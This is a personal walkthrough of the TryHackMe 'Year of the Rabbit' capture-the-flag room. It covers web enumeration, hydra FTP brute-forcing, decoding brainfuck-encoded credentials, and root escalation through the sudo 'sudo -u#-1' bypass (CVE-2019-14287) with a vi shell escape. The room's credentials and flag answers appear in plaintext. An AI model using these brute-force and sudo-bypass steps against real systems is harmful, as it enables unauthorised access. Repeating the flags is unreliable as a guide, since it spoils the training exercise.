# Year of the Rabbit
Difficulty: Easy

![c062ef0e0b4f70e51a2dafc5fc2bca0e](https://github.com/user-attachments/assets/8386dfbf-5c03-4426-8c5a-2f7c43ee06f0)


https://tryhackme.com/room/yearoftherabbit

---


Enumeration:

```bash
nmap 10.10.117.14 -sC -sV


feroxbuster -u http://10.10.117.14 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 404,403 --extract-links
```

10.10.117.14/assets

http://10.10.117.14/assets/style.css

  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php

intercept navigation to: 10.10.117.14/sup3r_s3cr3t_fl4g.php with burpsuite

forward once to unveil the following header:

GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1

navigate:

http://10.10.117.14/WExYY2Cv-qU/




met with a hot_babe.png file
http://10.10.117.14/WExYY2Cv-qU/Hot_Babe.png

download it:

wget http://10.10.117.14/WExYY2Cv-qU/Hot_Babe.png

strings Hot_Babe.png

scroll up a bit find the ftp username
"Eh, you've earned this. Username for FTP is ftpuser"

and then we get the following text too:
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9


Save the password list in passwords.txt

hydra -l ftpuser -P passwords.txt ftp://10.10.117.14

returned:

[21][ftp] host: 10.10.117.14   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-13 20:49:06



user the credentials to login to ftp:

ftp 10.10.117.14

login

ls -la

we see Eli's_Creds.txt

`get Eli's_Creds.txt`

the creds will save to desktop.

open the txt file to find:

+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <


The text is a brainfuck encoded string.

I had ChatGPT write me a python interpeter to decode the brainfuck locally:

```python
def brainfuck(code):
    tape = [0] * 30000
    ptr = 0
    i = 0
    output = ''
    loop_stack = []

    while i < len(code):
        cmd = code[i]
        if cmd == '>':
            ptr += 1
        elif cmd == '<':
            ptr -= 1
        elif cmd == '+':
            tape[ptr] = (tape[ptr] + 1) % 256
        elif cmd == '-':
            tape[ptr] = (tape[ptr] - 1) % 256
        elif cmd == '.':
            output += chr(tape[ptr])
        elif cmd == ',':
            pass  # not needed
        elif cmd == '[':
            if tape[ptr] == 0:
                open_loops = 1
                while open_loops:
                    i += 1
                    if code[i] == '[':
                        open_loops += 1
                    elif code[i] == ']':
                        open_loops -= 1
            else:
                loop_stack.append(i)
        elif cmd == ']':
            if tape[ptr] != 0:
                i = loop_stack[-1]
                continue
            else:
                loop_stack.pop()
        i += 1

    return output

with open("creds.txt") as f:
    code = f.read().replace('\n', '')
    print(brainfuck(code))
```

after running the script, we get this returned:

User: eli
Password: DSpDiM1wAEwid

use these credentials to ssh in:

`ssh eli@10.10.117.14`

1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE


`find / -name user.txt 2>/dev/null`

cat /home/gwendoline/user.txt
permission is denied

`user.txt` has restricted permissions (`r--r-----`) and is owned by `gwendoline`, so **you cannot read it unless you're that user**.

so lets look for the hiding place. It took me a bit to understand but I eventually discovered that I could simply:

`locate s3cr3t`

```bash
eli@year-of-the-rabbit:/home/gwendoline$ locate s3cr3t
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
```


`cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!`


we are returned with:
```bash
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root

```


so now we know Gwendoline's password is `MniVCQVhQHUNI`

`su gwendoline`
paste password

we can now cat out the user.txt
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}

---
Now we need the root flag, for this we will probably need to escalate privileges.

sudo -l
This command, when used with `sudo`, lists the commands you are allowed to run with elevated privileges.

```bash
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

```

**We see (All, !root) meaning root can't use sudo but sudo can be used by anyone else**

`sudo --version`

```bash
Sudo version 1.8.10p3
Sudoers policy plugin version 1.8.10p3
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.10p3
```


to check for root privs:
`whoami`: 

- Simply type `whoami` in the terminal.
- If the output is `root`, you are the root user.

2. `id -u`: 

- Type `id -u` in the terminal.
- If the output is `0`, you have root privileges.


honestly I search around for an exploit related to the sudo version of the box but I couldn't find anything that worked. I had to reference a writeup to find

https://www.exploit-db.com/exploits/47502

CVE 2019-14287 

run the following:

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

now you are in vim editor.
press `esc` key and type a : (colon) to execute commands

run !whoami  in vim

and now you can see you are root

so now we can run the following command in the vim editor:

!/bin/bash

now we have a root shell.

```bash
find / -name root.txt 2>/dev/null
cat /root/root.txt
```

now we have the flag

THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}


